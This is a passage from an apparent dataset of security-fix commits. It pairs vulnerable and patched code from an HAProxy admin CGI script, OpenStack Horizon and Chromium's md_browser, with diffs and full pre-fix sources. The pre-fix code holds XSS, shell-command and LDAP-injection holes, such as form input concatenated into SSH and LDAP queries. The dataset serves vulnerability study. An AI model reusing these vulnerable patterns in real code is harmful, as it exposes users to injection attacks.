create new '+form.getvalue('color')+' list. %s </div>' % e)\n\t\t\nif form.getvalue('bwlists_save'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists_save')\n\ttry:\n\t\twith open(list, \"w\") as file:\n\t\t\tfile.write(form.getvalue('bwlists_content'))\n\texcept IOError as e:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' % e)\n\t\n\tservers = sql.get_dick_permit()\n\tpath = sql.get_setting('haproxy_dir')+\"/\"+form.getvalue('color')\n\t\n\tfor server in servers:\n\t\tfunct.ssh_command(server[2], [\"sudo mkdir \"+path])\n\t\terror = funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath')\n\t\tif error:\n\t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>' % error)\t\t\t\n\t\telse:\n\t\t\tprint('<div class=\"alert alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>')\n\t\t\tif form.getvalue('bwlists_restart') == 'restart':\n\t\t\t\tfunct.ssh_command(server[2], [\"sudo \" + sql.get_setting('restart_command')])\n\t\t\t\nif form.getvalue('get_lists'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')\n\tlists = funct.get_files(dir=list, format=\"lst\")\n\tfor list in lists:\n\t\tprint(list)\n\t\t\nif form.getvalue('get_ldap_email'):\n\tusername = form.getvalue('get_ldap_email')\n\timport ldap\n\t\n\tserver = sql.get_setting('ldap_server')\n\tport = sql.get_setting('ldap_port')\n\tuser = sql.get_setting('ldap_user')\n\tpassword = sql.get_setting('ldap_password')\n\tldap_base = sql.get_setting('ldap_base')\n\tdomain = sql.get_setting('ldap_domain')\n\tldap_search_field = sql.get_setting('ldap_search_field')\n\n\tl = ldap.initialize(\"ldap://\"+server+':'+port)\n\ttry:\n\t\tl.protocol_version = ldap.VERSION3\n\t\tl.set_option(ldap.OPT_REFERRALS, 0)\n\n\t\tbind = l.simple_bind_s(user, password)\n\n\t\tcriteria = \"(&(objectClass=user)(sAMAccountName=\"+username+\"))\"\n\t\tattributes = [ldap_search_field]\n\t\tresult = l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes)\n\n\t\tresults = [entry for dn, entry in result if isinstance(entry, dict)]\n\t\ttry:\n\t\t\tprint('[\"'+results[0][ldap_search_field][0].decode(\"utf-8\")+'\",\"'+domain+'\"]')\n\t\texcept:\n\t\t\tprint('error: user not found')\n\tfinally:\n\t\tl.unbind()"}}, "msg": "v3.4.4.5\n\nXSS protect"}}, "https://github.com/AMfalme/Horizon_Openstack": {"a835dbfbaa2c70329c08d4b8429d49315dc6d651": {"url": "https://api.github.com/repos/AMfalme/Horizon_Openstack/commits/a835dbfbaa2c70329c08d4b8429d49315dc6d651", "html_url": "https://github.com/AMfalme/Horizon_Openstack/commit/a835dbfbaa2c70329c08d4b8429d49315dc6d651", "sha": "a835dbfbaa2c70329c08d4b8429d49315dc6d651", "keyword": "XSS correct", "diff": "diff --git a/openstack_dashboard/dashboards/identity/mappings/tables.py b/openstack_dashboard/dashboards/identity/mappings/tables.py\nindex df6e8f307..9c22285d6 100644\n--- a/openstack_dashboard/dashboards/identity/mappings/tables.py\n+++ b/openstack_dashboard/dashboards/identity/mappings/tables.py\n@@ -14,7 +14,6 @@\n \n import json\n \n-from django.utils import safestring\n from django.utils.translation import ugettext_lazy as _\n from django.utils.translation import ungettext_lazy\n \n@@ -75,7 +74,7 @@ def get_rules_as_json(mapping):\n     rules = getattr(mapping, 'rules', None)\n     if rules:\n         rules = json.dumps(rules, indent=4)\n-    return safestring.mark_safe(rules)\n+    return rules\n \n \n class MappingsTable(tables.DataTable):\n", "message": "", "files": {"/openstack_dashboard/dashboards/identity/mappings/tables.py": {"changes": [{"diff": "\n \n import json\n \n-from django.utils import safestring\n from django.utils.translation import ugettext_lazy as _\n from django.utils.translation import ungettext_lazy\n \n", "add": 0, "remove": 1, "filename": "/openstack_dashboard/dashboards/identity/mappings/tables.py", "badparts": ["from django.utils import safestring"], "goodparts": []}, {"diff": "\n     rules = getattr(mapping, 'rules', None)\n     if rules:\n         rules = json.dumps(rules, indent=4)\n-    return safestring.mark_safe(rules)\n+    return rules\n \n \n class MappingsTable(tables.DataTable):\n", "add": 1, "remove": 1, "filename": "/openstack_dashboard/dashboards/identity/mappings/tables.py", "badparts": ["    return safestring.mark_safe(rules)"], "goodparts": ["    return rules"]}], "source": "\n import json from django.utils import safestring from django.utils.translation import ugettext_lazy as _ from django.utils.translation import ungettext_lazy from horizon import tables from openstack_dashboard import api class CreateMappingLink(tables.LinkAction): name=\"create\" verbose_name=_(\"Create Mapping\") url=\"horizon:identity:mappings:create\" classes=(\"ajax-modal\",) icon=\"plus\" policy_rules=((\"identity\", \"identity:create_mapping\"),) class EditMappingLink(tables.LinkAction): name=\"edit\" verbose_name=_(\"Edit\") url=\"horizon:identity:mappings:update\" classes=(\"ajax-modal\",) icon=\"pencil\" policy_rules=((\"identity\", \"identity:update_mapping\"),) class DeleteMappingsAction(tables.DeleteAction): @staticmethod def action_present(count): return ungettext_lazy( u\"Delete Mapping\", u\"Delete Mappings\", count ) @staticmethod def action_past(count): return ungettext_lazy( u\"Deleted Mapping\", u\"Deleted Mappings\", count ) policy_rules=((\"identity\", \"identity:delete_mapping\"),) def delete(self, request, obj_id): api.keystone.mapping_delete(request, obj_id) class MappingFilterAction(tables.FilterAction): def filter(self, table, mappings, filter_string): \"\"\"Naive case-insensitive search.\"\"\" q=filter_string.lower() return[mapping for mapping in mappings if q in mapping.ud.lower()] def get_rules_as_json(mapping): rules=getattr(mapping, 'rules', None) if rules: rules=json.dumps(rules, indent=4) return safestring.mark_safe(rules) class MappingsTable(tables.DataTable): id=tables.Column('id', verbose_name=_('Mapping ID')) description=tables.Column(get_rules_as_json, verbose_name=_('Rules')) class Meta(object): name=\"idp_mappings\" verbose_name=_(\"Attribute Mappings\") row_actions=(EditMappingLink, DeleteMappingsAction) table_actions=(MappingFilterAction, CreateMappingLink, DeleteMappingsAction) ", "sourceWithComments": "# Copyright (C) 2015 Yahoo! Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport json\n\nfrom django.utils import safestring\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.utils.translation import ungettext_lazy\n\nfrom horizon import tables\n\nfrom openstack_dashboard import api\n\n\nclass CreateMappingLink(tables.LinkAction):\n    name = \"create\"\n    verbose_name = _(\"Create Mapping\")\n    url = \"horizon:identity:mappings:create\"\n    classes = (\"ajax-modal\",)\n    icon = \"plus\"\n    policy_rules = ((\"identity\", \"identity:create_mapping\"),)\n\n\nclass EditMappingLink(tables.LinkAction):\n    name = \"edit\"\n    verbose_name = _(\"Edit\")\n    url = \"horizon:identity:mappings:update\"\n    classes = (\"ajax-modal\",)\n    icon = \"pencil\"\n    policy_rules = ((\"identity\", \"identity:update_mapping\"),)\n\n\nclass DeleteMappingsAction(tables.DeleteAction):\n    @staticmethod\n    def action_present(count):\n        return ungettext_lazy(\n            u\"Delete Mapping\",\n            u\"Delete Mappings\",\n            count\n        )\n\n    @staticmethod\n    def action_past(count):\n        return ungettext_lazy(\n            u\"Deleted Mapping\",\n            u\"Deleted Mappings\",\n            count\n        )\n    policy_rules = ((\"identity\", \"identity:delete_mapping\"),)\n\n    def delete(self, request, obj_id):\n        api.keystone.mapping_delete(request, obj_id)\n\n\nclass MappingFilterAction(tables.FilterAction):\n    def filter(self, table, mappings, filter_string):\n        \"\"\"Naive case-insensitive search.\"\"\"\n        q = filter_string.lower()\n        return [mapping for mapping in mappings\n                if q in mapping.ud.lower()]\n\n\ndef get_rules_as_json(mapping):\n    rules = getattr(mapping, 'rules', None)\n    if rules:\n        rules = json.dumps(rules, indent=4)\n    return safestring.mark_safe(rules)\n\n\nclass MappingsTable(tables.DataTable):\n    id = tables.Column('id', verbose_name=_('Mapping ID'))\n    description = tables.Column(get_rules_as_json,\n                                verbose_name=_('Rules'))\n\n    class Meta(object):\n        name = \"idp_mappings\"\n        verbose_name = _(\"Attribute Mappings\")\n        row_actions = (EditMappingLink, DeleteMappingsAction)\n        table_actions = (MappingFilterAction, CreateMappingLink,\n                         DeleteMappingsAction)\n"}}, "msg": "Remove dangerous safestring declaration\n\nThis declaration allows XSS content through the JSON and\nis unnecessary for correct rendering of the content anyway.\n\nChange-Id: I82355b37108609ae573237424e528aab86a24efc\nCloses-Bug: 1667086"}}, "https://github.com/cjbd/src": {"e11db126ab1874bd2442e60f18d34c10f3697742": {"url": "https://api.github.com/repos/cjbd/src/commits/e11db126ab1874bd2442e60f18d34c10f3697742", "html_url": "https://github.com/cjbd/src/commit/e11db126ab1874bd2442e60f18d34c10f3697742", "sha": "e11db126ab1874bd2442e60f18d34c10f3697742", "keyword": "XSS correct", "diff": "diff --git a/tools/md_browser/md_browser.py b/tools/md_browser/md_browser.py\nindex 5062ab345fd6..e24e29ffe434 100755\n--- a/tools/md_browser/md_browser.py\n+++ b/tools/md_browser/md_browser.py\n@@ -9,6 +9,7 @@\n import SimpleHTTPServer\n import SocketServer\n import argparse\n+import cgi\n import codecs\n import os\n import re\n@@ -16,6 +17,7 @@\n import sys\n import threading\n import time\n+import urllib\n import webbrowser\n from xml.etree import ElementTree\n \n@@ -124,6 +126,7 @@ def server_bind(self):\n \n class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n   def do_GET(self):\n+    self.path = urllib.unquote(self.path)\n     path = self.path\n \n     # strip off the repo and branch info, if present, for compatibility\n@@ -226,12 +229,13 @@ def _DoCSS(self, template):\n \n   def _DoNotFound(self):\n     self._WriteHeader('text/html', status_code=404)\n-    self.wfile.write('<html><body>%s not found</body></html>' % self.path)\n+    self.wfile.write(\n+        '<html><body>%s not found</body></html>' % cgi.escape(self.path))\n \n   def _DoUnknown(self):\n     self._WriteHeader('text/html', status_code=501)\n     self.wfile.write('<html><body>I do not know how to serve %s.</body>'\n-                       '</html>' % self.path)\n+                     '</html>' % cgi.escape(self.path))\n \n   def _DoDirListing(self, full_path):\n     self._WriteHeader('text/html')\n@@ -239,27 +243,32 @@ def _DoDirListing(self, full_path):\n     self.wfile.write('<div class=\"doc\">')\n \n     self.wfile.write('<div class=\"Breadcrumbs\">\\n')\n-    self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path)\n+    self.wfile.write(\n+        '<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % cgi.escape(self.path))\n     self.wfile.write('</div>\\n')\n \n+    escaped_dir = cgi.escape(self.path.rstrip('/'), quote=True)\n+\n     for _, dirs, files in os.walk(full_path):\n       for f in sorted(files):\n         if f.startswith('.'):\n           continue\n+        f = cgi.escape(f, quote=True)\n         if f.endswith('.md'):\n           bold = ('<b>', '</b>')\n         else:\n           bold = ('', '')\n         self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' %\n-                         (self.path.rstrip('/'), f, bold[0], f, bold[1]))\n+                         (escaped_dir, f, bold[0], f, bold[1]))\n \n       self.wfile.write('<br/>\\n')\n \n       for d in sorted(dirs):\n         if d.startswith('.'):\n           continue\n+        d = cgi.escape(d, quote=True)\n         self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' %\n-                         (self.path.rstrip('/'), d, d))\n+                         (escaped_dir, d, d))\n \n       break\n \n", "message": "", "files": {"/tools/md_browser/md_browser.py": {"changes": [{"diff": "\n     self.wfile.write('<div class=\"doc\">')\n \n     self.wfile.write('<div class=\"Breadcrumbs\">\\n')\n-    self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path)\n+    self.wfile.write(\n+        '<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % cgi.escape(self.path))\n     self.wfile.write('</div>\\n')\n \n+    escaped_dir = cgi.escape(self.path.rstrip('/'), quote=True)\n+\n     for _, dirs, files in os.walk(full_path):\n       for f in sorted(files):\n         if f.startswith('.'):\n           continue\n+        f = cgi.escape(f, quote=True)\n         if f.endswith('.md'):\n           bold = ('<b>', '</b>')\n         else:\n           bold = ('', '')\n         self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' %\n-                         (self.path.rstrip('/'), f, bold[0], f, bold[1]))\n+                         (escaped_dir, f, bold[0], f, bold[1]))\n \n       self.wfile.write('<br/>\\n')\n \n       for d in sorted(dirs):\n         if d.startswith('.'):\n           continue\n+        d = cgi.escape(d, quote=True)\n         self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' %\n-                         (self.path.rstrip('/'), d, d))\n+                         (escaped_dir, d, d))\n \n       break\n \n", "add": 8, "remove": 3, "filename": "/tools/md_browser/md_browser.py", "badparts": ["    self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path)", "                         (self.path.rstrip('/'), f, bold[0], f, bold[1]))", "                         (self.path.rstrip('/'), d, d))"], "goodparts": ["    self.wfile.write(", "        '<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % cgi.escape(self.path))", "    escaped_dir = cgi.escape(self.path.rstrip('/'), quote=True)", "        f = cgi.escape(f, quote=True)", "                         (escaped_dir, f, bold[0], f, bold[1]))", "        d = cgi.escape(d, quote=True)", "                         (escaped_dir, d, d))"]}], "source": "\n \"\"\"Simple Markdown browser for a Git checkout.\"\"\" from __future__ import print_function import SimpleHTTPServer import SocketServer import argparse import codecs import os import re import socket import sys import threading import time import webbrowser from xml.etree import ElementTree THIS_DIR=os.path.realpath(os.path.dirname(__file__)) SRC_DIR=os.path.dirname(os.path.dirname(THIS_DIR)) sys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port', type=int, default=8080, help='port to run on(default=%(default)s)') parser.add_argument('-d', '--directory', type=str, default=SRC_DIR) parser.add_argument('-e', '--external', action='store_true', help='whether to bind to external port') parser.add_argument('file', nargs='?', help='open file in browser') args=parser.parse_args(argv) top_level=os.path.realpath(args.directory) hostname='0.0.0.0' if args.external else 'localhost' server_address=(hostname, args.port) s=Server(server_address, top_level) origin='http://' +hostname if args.port !=80: origin +=':%s' % args.port print('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory)) return 1 rpath=os.path.relpath(path, top_level) url='%s/%s' %(origin, rpath) print('Opening %s' % url) thread=threading.Thread(target=_open_url, args=(url,)) thread.start() elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')): print(' Try loading %s/docs/README.md' % origin) elif os.path.isfile(os.path.join(args.directory, 'README.md')): print(' Try loading %s/README.md' % origin) retcode=1 try: s.serve_forever() except KeyboardInterrupt: retcode=130 except Exception as e: print('Exception raised: %s' % str(e)) s.shutdown() if thread: thread.join() return retcode def _open_url(url): time.sleep(1) webbrowser.open(url) def _gitiles_slugify(value, _separator): \"\"\"Convert a string(representing a section title) to URL anchor name. This function is passed to \"toc\" extension as an extension option, so we can emulate the way how Gitiles converts header titles to URL anchors. Gitiles' official documentation about the conversion is at: https://gerrit.googlesource.com/gitiles/+/master/Documentation/markdown.md Args: value: The name of a section that is to be converted. _separator: Unused. This is actually a configurable string that is used as a replacement character for spaces in the title, typically set to '-'. Since we emulate Gitiles' way of slugification here, it makes little sense to have the separator charactor configurable. \"\"\" value=value.encode('ascii', 'replace') value=re.sub(r'[^-a-zA-Z0-9]', '_', value) value=value.replace(u' ', u'-') value=re.sub(r'([-_])[-_]+', r'\\1', value) return value class Server(SocketServer.TCPServer): def __init__(self, server_address, top_level): SocketServer.TCPServer.__init__(self, server_address, Handler) self.top_level=top_level def server_bind(self): self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.bind(self.server_address) class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_GET(self): path=self.path if path.startswith('/chromium/src/+/master'): path=path[len('/chromium/src/+/master'):] full_path=os.path.realpath(os.path.join(self.server.top_level, path[1:])) if not full_path.startswith(self.server.top_level): self._DoUnknown() elif path in('/base.css', '/doc.css', '/prettify.css'): self._DoCSS(path[1:]) elif not os.path.exists(full_path): self._DoNotFound() elif path.lower().endswith('.md'): self._DoMD(path) elif os.path.exists(full_path +'/README.md'): self._DoMD(path +'/README.md') elif path.lower().endswith('.png'): self._DoImage(full_path, 'image/png') elif path.lower().endswith('.jpg'): self._DoImage(full_path, 'image/jpeg') elif os.path.isdir(full_path): self._DoDirListing(full_path) elif os.path.exists(full_path): self._DoRawSourceFile(full_path) else: self._DoUnknown() def _DoMD(self, path): extensions=[ 'markdown.extensions.def_list', 'markdown.extensions.fenced_code', 'markdown.extensions.tables', 'markdown.extensions.toc', 'gitiles_autolink', 'gitiles_ext_blocks', 'gitiles_smart_quotes', ] extension_configs={ 'markdown.extensions.toc':{ 'slugify': _gitiles_slugify }, } contents=self._Read(path[1:]) md=markdown.Markdown(extensions=extensions, extension_configs=extension_configs, tab_length=2, output_format='html4') has_a_single_h1=(len([line for line in contents.splitlines() if(line.startswith(' not line.startswith(' md.treeprocessors['adjust_toc']=_AdjustTOC(has_a_single_h1) md_fragment=md.convert(contents).encode('utf-8') try: self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write(md_fragment) self.wfile.write('</div>') self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">') with open(full_path) as fp: data=fp.read().replace( '&', '&amp;').replace( '<', '&lt;').replace( '>', '&gt;').replace( '\"', '&quot;') for i, line in enumerate(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%(num)s</a></td>' '<td class=\"FileContents-lineContents\">%(line)s</td></tr>') %{'num': i, 'quot': \"'\", 'line': line}) self.wfile.write('</table>') self._WriteTemplate('footer.html') def _DoCSS(self, template): self._WriteHeader('text/css') self._WriteTemplate(template) def _DoNotFound(self): self._WriteHeader('text/html', status_code=404) self.wfile.write('<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not know how to serve %s.</body>' '</html>' % self.path) def _DoDirListing(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write('<div class=\"Breadcrumbs\">\\n') self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path) self.wfile.write('</div>\\n') for _, dirs, files in os.walk(full_path): for f in sorted(files): if f.startswith('.'): continue if f.endswith('.md'): bold=('<b>', '</b>') else: bold=('', '') self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip('/'), f, bold[0], f, bold[1])) self.wfile.write('<br/>\\n') for d in sorted(dirs): if d.startswith('.'): continue self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' % (self.path.rstrip('/'), d, d)) break self.wfile.write('</div>') self._WriteTemplate('footer.html') def _DoImage(self, full_path, mime_type): self._WriteHeader(mime_type) with open(full_path) as f: self.wfile.write(f.read()) f.close() def _Read(self, relpath, relative_to=None): if relative_to is None: relative_to=self.server.top_level assert not relpath.startswith(os.sep) path=os.path.join(relative_to, relpath) with codecs.open(path, encoding='utf-8') as fp: return fp.read() def _WriteHeader(self, content_type='text/plain', status_code=200): self.send_response(status_code) self.send_header('Content-Type', content_type) self.end_headers() def _WriteTemplate(self, template): contents=self._Read(os.path.join('tools', 'md_browser', template), relative_to=SRC_DIR) self.wfile.write(contents.encode('utf-8')) class _AdjustTOC(markdown.treeprocessors.Treeprocessor): def __init__(self, has_a_single_h1): super(_AdjustTOC, self).__init__() self.has_a_single_h1=has_a_single_h1 def run(self, tree): for toc_node in tree.findall(\".//*[@class='toc']\"): toc_ul=toc_node[0] if self.has_a_single_h1: toc_ul_li=toc_ul[0] ul_with_the_desired_toc_entries=toc_ul_li[1] else: ul_with_the_desired_toc_entries=toc_ul toc_node.remove(toc_ul) contents=ElementTree.SubElement(toc_node, 'h2') contents.text='Contents' contents.tail='\\n' toc_aux=ElementTree.SubElement(toc_node, 'div',{'class': 'toc-aux'}) toc_aux.text='\\n' toc_aux.append(ul_with_the_desired_toc_entries) toc_aux.tail='\\n' if __name__=='__main__': sys.exit(main(sys.argv[1:])) ", "sourceWithComments": "#!/usr/bin/env python\n# Copyright 2015 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n\"\"\"Simple Markdown browser for a Git checkout.\"\"\"\nfrom __future__ import print_function\n\nimport SimpleHTTPServer\nimport SocketServer\nimport argparse\nimport codecs\nimport os\nimport re\nimport socket\nimport sys\nimport threading\nimport time\nimport webbrowser\nfrom xml.etree import ElementTree\n\n\nTHIS_DIR = os.path.realpath(os.path.dirname(__file__))\nSRC_DIR = os.path.dirname(os.path.dirname(THIS_DIR))\nsys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown'))\nimport markdown\n\n\ndef main(argv):\n  parser = argparse.ArgumentParser(prog='md_browser')\n  parser.add_argument('-p', '--port', type=int, default=8080,\n                      help='port to run on (default = %(default)s)')\n  parser.add_argument('-d', '--directory', type=str, default=SRC_DIR)\n  parser.add_argument('-e', '--external', action='store_true',\n                      help='whether to bind to external port')\n  parser.add_argument('file', nargs='?',\n                      help='open file in browser')\n  args = parser.parse_args(argv)\n\n  top_level = os.path.realpath(args.directory)\n  hostname = '0.0.0.0' if args.external else 'localhost'\n  server_address = (hostname, args.port)\n  s = Server(server_address, top_level)\n\n  origin = 'http://' + hostname\n  if args.port != 80:\n    origin += ':%s' % args.port\n  print('Listening on %s/' % origin)\n\n  thread = None\n  if args.file:\n    path = os.path.realpath(args.file)\n    if not path.startswith(top_level):\n      print('%s is not under %s' % (args.file, args.directory))\n      return 1\n    rpath = os.path.relpath(path, top_level)\n    url = '%s/%s' % (origin, rpath)\n    print('Opening %s' % url)\n    thread = threading.Thread(target=_open_url, args=(url,))\n    thread.start()\n\n  elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')):\n    print(' Try loading %s/docs/README.md' % origin)\n  elif os.path.isfile(os.path.join(args.directory, 'README.md')):\n    print(' Try loading %s/README.md' % origin)\n\n  retcode = 1\n  try:\n    s.serve_forever()\n  except KeyboardInterrupt:\n    retcode = 130\n  except Exception as e:\n    print('Exception raised: %s' % str(e))\n\n  s.shutdown()\n  if thread:\n    thread.join()\n  return retcode\n\n\ndef _open_url(url):\n  time.sleep(1)\n  webbrowser.open(url)\n\n\ndef _gitiles_slugify(value, _separator):\n  \"\"\"Convert a string (representing a section title) to URL anchor name.\n\n  This function is passed to \"toc\" extension as an extension option, so we\n  can emulate the way how Gitiles converts header titles to URL anchors.\n\n  Gitiles' official documentation about the conversion is at:\n\n  https://gerrit.googlesource.com/gitiles/+/master/Documentation/markdown.md#Named-anchors\n\n  Args:\n    value: The name of a section that is to be converted.\n    _separator: Unused. This is actually a configurable string that is used\n        as a replacement character for spaces in the title, typically set to\n        '-'. Since we emulate Gitiles' way of slugification here, it makes\n        little sense to have the separator charactor configurable.\n  \"\"\"\n\n  # TODO(yutak): Implement accent removal. This does not seem easy without\n  # some library. For now we just make accented characters turn into\n  # underscores, just like other non-ASCII characters.\n\n  value = value.encode('ascii', 'replace')  # Non-ASCII turns into '?'.\n  value = re.sub(r'[^- a-zA-Z0-9]', '_', value)  # Non-alphanumerics to '_'.\n  value = value.replace(u' ', u'-')\n  value = re.sub(r'([-_])[-_]+', r'\\1', value)  # Fold hyphens and underscores.\n  return value\n\n\nclass Server(SocketServer.TCPServer):\n  def __init__(self, server_address, top_level):\n    SocketServer.TCPServer.__init__(self, server_address, Handler)\n    self.top_level = top_level\n\n  def server_bind(self):\n    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    self.socket.bind(self.server_address)\n\n\nclass Handler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n  def do_GET(self):\n    path = self.path\n\n    # strip off the repo and branch info, if present, for compatibility\n    # with gitiles.\n    if path.startswith('/chromium/src/+/master'):\n      path = path[len('/chromium/src/+/master'):]\n\n    full_path = os.path.realpath(os.path.join(self.server.top_level, path[1:]))\n\n    if not full_path.startswith(self.server.top_level):\n      self._DoUnknown()\n    elif path in ('/base.css', '/doc.css', '/prettify.css'):\n      self._DoCSS(path[1:])\n    elif not os.path.exists(full_path):\n      self._DoNotFound()\n    elif path.lower().endswith('.md'):\n      self._DoMD(path)\n    elif os.path.exists(full_path + '/README.md'):\n      self._DoMD(path + '/README.md')\n    elif path.lower().endswith('.png'):\n      self._DoImage(full_path, 'image/png')\n    elif path.lower().endswith('.jpg'):\n      self._DoImage(full_path, 'image/jpeg')\n    elif os.path.isdir(full_path):\n      self._DoDirListing(full_path)\n    elif os.path.exists(full_path):\n      self._DoRawSourceFile(full_path)\n    else:\n      self._DoUnknown()\n\n  def _DoMD(self, path):\n    extensions = [\n        'markdown.extensions.def_list',\n        'markdown.extensions.fenced_code',\n        'markdown.extensions.tables',\n        'markdown.extensions.toc',\n        'gitiles_autolink',\n        'gitiles_ext_blocks',\n        'gitiles_smart_quotes',\n    ]\n    extension_configs = {\n        'markdown.extensions.toc': {\n            'slugify': _gitiles_slugify\n        },\n    }\n\n    contents = self._Read(path[1:])\n\n    md = markdown.Markdown(extensions=extensions,\n                           extension_configs=extension_configs,\n                           tab_length=2,\n                           output_format='html4')\n\n    has_a_single_h1 = (len([line for line in contents.splitlines()\n                            if (line.startswith('#') and\n                                not line.startswith('##'))]) == 1)\n\n    md.treeprocessors['adjust_toc'] = _AdjustTOC(has_a_single_h1)\n\n    md_fragment = md.convert(contents).encode('utf-8')\n\n    try:\n      self._WriteHeader('text/html')\n      self._WriteTemplate('header.html')\n      self.wfile.write('<div class=\"doc\">')\n      self.wfile.write(md_fragment)\n      self.wfile.write('</div>')\n      self._WriteTemplate('footer.html')\n    except:\n      raise\n\n  def _DoRawSourceFile(self, full_path):\n    self._WriteHeader('text/html')\n    self._WriteTemplate('header.html')\n\n    self.wfile.write('<table class=\"FileContents\">')\n    with open(full_path) as fp:\n      # Escape html over the entire file at once.\n      data = fp.read().replace(\n          '&', '&amp;').replace(\n          '<', '&lt;').replace(\n          '>', '&gt;').replace(\n          '\"', '&quot;')\n      for i, line in enumerate(data.splitlines(), start=1):\n        self.wfile.write(\n          ('<tr class=\"u-pre u-monospace FileContents-line\">'\n           '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">'\n           '<a name=\"%(num)s\" '\n           'onclick=\"window.location.hash=%(quot)s#%(num)s%(quot)s\">'\n           '%(num)s</a></td>'\n           '<td class=\"FileContents-lineContents\">%(line)s</td></tr>')\n          % {'num': i, 'quot': \"'\", 'line': line})\n    self.wfile.write('</table>')\n\n    self._WriteTemplate('footer.html')\n\n  def _DoCSS(self, template):\n    self._WriteHeader('text/css')\n    self._WriteTemplate(template)\n\n  def _DoNotFound(self):\n    self._WriteHeader('text/html', status_code=404)\n    self.wfile.write('<html><body>%s not found</body></html>' % self.path)\n\n  def _DoUnknown(self):\n    self._WriteHeader('text/html', status_code=501)\n    self.wfile.write('<html><body>I do not know how to serve %s.</body>'\n                       '</html>' % self.path)\n\n  def _DoDirListing(self, full_path):\n    self._WriteHeader('text/html')\n    self._WriteTemplate('header.html')\n    self.wfile.write('<div class=\"doc\">')\n\n    self.wfile.write('<div class=\"Breadcrumbs\">\\n')\n    self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path)\n    self.wfile.write('</div>\\n')\n\n    for _, dirs, files in os.walk(full_path):\n      for f in sorted(files):\n        if f.startswith('.'):\n          continue\n        if f.endswith('.md'):\n          bold = ('<b>', '</b>')\n        else:\n          bold = ('', '')\n        self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' %\n                         (self.path.rstrip('/'), f, bold[0], f, bold[1]))\n\n      self.wfile.write('<br/>\\n')\n\n      for d in sorted(dirs):\n        if d.startswith('.'):\n          continue\n        self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' %\n                         (self.path.rstrip('/'), d, d))\n\n      break\n\n    self.wfile.write('</div>')\n    self._WriteTemplate('footer.html')\n\n  def _DoImage(self, full_path, mime_type):\n    self._WriteHeader(mime_type)\n    with open(full_path) as f:\n      self.wfile.write(f.read())\n      f.close()\n\n  def _Read(self, relpath, relative_to=None):\n    if relative_to is None:\n      relative_to = self.server.top_level\n    assert not relpath.startswith(os.sep)\n    path = os.path.join(relative_to, relpath)\n    with codecs.open(path, encoding='utf-8') as fp:\n      return fp.read()\n\n  def _WriteHeader(self, content_type='text/plain', status_code=200):\n    self.send_response(status_code)\n    self.send_header('Content-Type', content_type)\n    self.end_headers()\n\n  def _WriteTemplate(self, template):\n    contents = self._Read(os.path.join('tools', 'md_browser', template),\n                          